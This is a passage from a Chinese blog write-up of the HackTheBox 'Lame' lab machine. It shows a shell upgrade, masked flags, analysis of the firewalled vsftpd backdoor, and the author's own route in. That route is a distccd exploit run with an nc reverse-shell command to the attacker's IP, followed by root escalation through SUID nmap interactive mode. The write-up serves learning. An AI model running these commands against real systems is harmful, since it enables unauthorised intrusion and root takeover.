<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">root@lame:/#</span><br></pre></td></tr></table></figure>

<p>然后，拿到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@lame:/home# find . -name user.txt -exec cat &#123;&#125; \;</span><br><span class="line">69454a93************************</span><br><span class="line"></span><br><span class="line">root@lame:/root# cat root.txt</span><br><span class="line">92caac3b************************</span><br></pre></td></tr></table></figure>

<h2 id="Root后-VSFTPd"><a href="#Root后-VSFTPd" class="headerlink" title="Root后 - VSFTPd"></a>Root后 - VSFTPd</h2><p>VSFTPD到底发生了什么？当我一开始用<code>nmap</code>扫描这台机器时，它只列举出了5个端口21，22，139，445和3632的某个服务，但在shell下，我可以看到更多监听的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">oot@lame:/# netstat -tnlp</span><br><span class="line">Active Internet connections (only servers)                                                           </span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     </span><br><span class="line">tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      5038/xinetd          </span><br><span class="line">tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      5038/xinetd          </span><br><span class="line">tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                    </span><br><span class="line">tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      5038/xinetd          </span><br><span class="line">tcp        0      0 0.0.0.0:48836           0.0.0.0:*               LISTEN      5185/rmiregistry     </span><br><span class="line">tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      5144/jsvc            </span><br><span class="line">tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      5194/unrealircd      </span><br><span class="line">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4759/mysqld          </span><br><span class="line">tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      5185/rmiregistry     </span><br><span class="line">tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      5194/unrealircd      </span><br><span class="line">tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      5013/smbd            </span><br><span class="line">tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      5208/Xtightvnc       </span><br><span class="line">tcp        0      0 0.0.0.0:41292           0.0.0.0:*               LISTEN      4935/rpc.mountd      </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      4217/portmap         </span><br><span class="line">tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5208/Xtightvnc       </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5164/apache2         </span><br><span class="line">tcp        0      0 0.0.0.0:55312           0.0.0.0:*               LISTEN      -                    </span><br><span class="line">tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      5190/ruby            </span><br><span class="line">tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      5144/jsvc            </span><br><span class="line">tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      5038/xinetd          </span><br><span class="line">tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      5038/xinetd          </span><br><span class="line">tcp        0      0 10.10.10.3:53           0.0.0.0:*               LISTEN      4612/named           </span><br><span class="line">tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      4612/named           </span><br><span class="line">tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      5038/xinetd          </span><br><span class="line">tcp        0      0 0.0.0.0:60855           0.0.0.0:*               LISTEN      4235/rpc.statd       </span><br><span class="line">tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      4840/postgres   </span><br><span class="line">tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      5003/master     </span><br><span class="line">tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      4612/named      </span><br><span class="line">tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      5013/smbd       </span><br><span class="line">tcp6       0      0 :::2121                 :::*                    LISTEN      5082/proftpd: (acce</span><br><span class="line">tcp6       0      0 :::3632                 :::*                    LISTEN      4867/distccd    </span><br><span class="line">tcp6       0      0 :::53                   :::*                    LISTEN      4612/named      </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      4636/sshd       </span><br><span class="line">tcp6       0      0 :::5432                 :::*                    LISTEN      4840/postgres   </span><br><span class="line">tcp6       0      0 ::1:953                 :::*                    LISTEN      4612/named     </span><br></pre></td></tr></table></figure>

<p>肯定是防火墙搞的鬼！</p>
<p>这意味着即使后门被触发，它在6200端口进行了监听，但却没办法到达我的主机，我将会进一步测试它。</p>
<p>为了进一步演示，我切换用户为<code>makis</code> :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@lame:/etc# su - makis -c bash</span><br><span class="line">makis@lame:~$ nc 127.0.0.1 6200</span><br><span class="line">(UNKNOWN) [127.0.0.1] 6200 (?) : Connection refused</span><br></pre></td></tr></table></figure>

<p>我没办法直接连到后门，但当我再一次触发后门时，现在我就可以连上并且获得了一个root的shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makis@lame:~$ nc 127.0.0.1 6200</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<p>我可以看到端口正在监听中:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@lame:/etc# netstat -tnlp  grep 6200</span><br><span class="line">tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      5580/vsftpd  </span><br></pre></td></tr></table></figure>

<p>(以上内容均翻译自：<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/04/07/htb-lame.html">https://0xdf.gitlab.io/2020/04/07/htb-lame.html</a>)</p>
<h2 id="distccd利用"><a href="#distccd利用" class="headerlink" title="distccd利用"></a>distccd利用</h2><p>说起来有些惭愧，我第一次打这台机器的时候，完全没注意到vsftpd和samba的版本，我偏偏选择了最长的那条路….</p>
<p>我从这台最简单的靶机中学会了：enumerate，enumerate，enumerate，不要漏掉任何一个细节！！！</p>
<p>所以，我把突破口放在了<code>distccd</code>服务上，从<a target="_blank" rel="noopener" href="https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855">Github</a>中找到了一个RCE的POC脚本，然后执行一下命令，就可以拿到<code>daemon</code>用户的shell了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py -t 10.10.10.3 -p 3632 -c &#x27;nc -e /bin/bash 10.10.16.10 4444&#x27;</span><br></pre></td></tr></table></figure>

<p>提权时，运行<code>sudo -l</code>，提示需要密码，放弃！</p>
<p>运行<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，查找所有权限为SUID的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/bin/umount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/ping6</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">/lib/dhcp3-client/call-dhclient-script</span><br><span class="line">/usr/bin/sudoedit</span><br><span class="line">/usr/bin/X</span><br><span class="line">/usr/bin/netkit-rsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/netkit-rlogin</span><br><span class="line">/usr/bin/arping</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/nmap</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/netkit-rcp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mtr</span><br><span class="line">/usr/sbin/uuidd</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/lib/telnetlogin</span><br><span class="line">/usr/lib/apache2/suexec</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br></pre></td></tr></table></figure>

<p>找到<code>/usr/bin/nmap</code>，执行以下命令，拿到root的shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure></div><div class="tags"><a href="/tags/htb"><i class="fa fa-tag">htb</i></a></div><div class="post-nav"><a class="pre" href="/p/reverse-baidunetdisk-1/">逆向百度云盘（一）：项目介绍</a><a class="next" href="/p/htb-trick/">HTB中对Trick靶机思路的整理及复盘</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="author-info"><a class="info-avatar" href="/about-me/" title="关于"><img class="nofancybox" src="/img/avatar.png"/></a><p>stay hungry, stay foolish</p><a class="info-icon" href="https://twitter.com/gaoxiaodiao" title="Twitter" target="_blank" style="margin-inline:5px"> <i class="fa fa-twitter-square" style="margin-inline:5px"></i></a><a class="info-icon" href="mailto:admin@domain.com" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/gaoxiaodiao" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a><a class="info-icon" href="/atom.xml" title="RSS" target="_blank" style="margin-inline:5px"> <i class="fa fa-rss-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/linux%E5%BC%80%E5%8F%91/" style="font-size: 15px;">linux开发</a> <a href="/tags/mac%E5%BC%80%E5%8F%91/" style="font-size: 15px;">mac开发</a> <a href="/tags/%E9%80%86%E5%90%91-%E7%A0%B4%E8%A7%A3/" style="font-size: 15px;">逆向&破解</a> <a href="/tags/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E7%BC%96%E8%AF%91/" style="font-size: 15px;">第三方库编译</a> <a href="/tags/%E5%B7%A5%E6%AC%B2%E5%96%84%E5%85%B6%E4%BA%8B-%E5%BF%85%E5%85%88%E5%88%A9%E5%85%B6%E5%99%A8/" style="font-size: 15px;">工欲善其事,必先利其器</a> <a href="/tags/%E5%BC%80%E5%8F%91-%E4%BB%A3%E7%A0%81/" style="font-size: 15px;">开发&代码</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 15px;">笔记</a> <a href="/tags/%E5%A4%AA%E7%9B%91/" style="font-size: 15px;">太监</a> <a href="/tags/%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4-%E4%BF%AE%E5%A4%8D/" style="font-size: 15px;">故障排除/修复</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/ChatGPT%E6%97%A0%E6%B3%95%E5%81%9A%E5%88%B0%E7%9A%84%E4%BA%8B%E6%83%85/" style="font-size: 15px;">ChatGPT无法做到的事情</a> <a href="/tags/%E5%89%AF%E4%B8%9A%E6%8E%A2%E7%B4%A2/" style="font-size: 15px;">副业探索</a> <a href="/tags/Foundry/" style="font-size: 15px;">Foundry</a> <a href="/tags/%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/" style="font-size: 15px;">心路历程</a> <a href="/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" style="font-size: 15px;">奇技淫巧</a> <a href="/tags/%E5%8E%9F%E5%A7%8B%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/" style="font-size: 15px;">原始知识积累</a> <a href="/tags/htb/" style="font-size: 15px;">htb</a> <a href="/tags/PowerShell/" style="font-size: 15px;">PowerShell</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/p/lady-luck-is-smiling-2/">幸运女神在微笑（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/p/lady-luck-is-smiling-1/">幸运女神在微笑（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/p/the-third-wave-reading-notes-6/">读书与思考之《第三次浪潮》第六章</a></li><li class="post-list-item"><a class="post-list-link" href="/p/the-third-wave-reading-notes-5/">读书与思考之《第三次浪潮》第五章</a></li><li class="post-list-item"><a class="post-list-link" href="/p/how-to-modify-registry-by-powershell/">如何通过PowerShell来创建、读取、修改、删除注册表？</a></li><li class="post-list-item"><a class="post-list-link" href="/p/the-third-wave-reading-notes-3_4/">读书与思考之《第三次浪潮》第三、四章</a></li><li class="post-list-item"><a class="post-list-link" href="/p/investment-cryptocurrency-diary-1/">加密货币投资日记（一）：序言</a></li><li class="post-list-item"><a class="post-list-link" href="/p/how-to-use-forge-for-testing-2/">how-to-use-forge-for-testing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/p/how-to-use-forge-for-testing-2/">学习Foundry之编写测试代码（二）：标准库与作弊码</a></li><li class="post-list-item"><a class="post-list-link" href="/p/how-to-use-forge-for-testing-1/">学习Foundry之编写测试代码（一）：初识Test合约</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://gaoxiaodiao.com/" title="高小调博客" target="_blank">高小调博客</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2023 <a href="/." rel="nofollow">知识证明.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0"></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.css"><script type="text/javascript" src="/js/love.js?v=1.0.0"></script><script type="text/javascript" src="/js/copycode.js?v=1.0.0" successtext="复制成功！"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=1.0.0"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>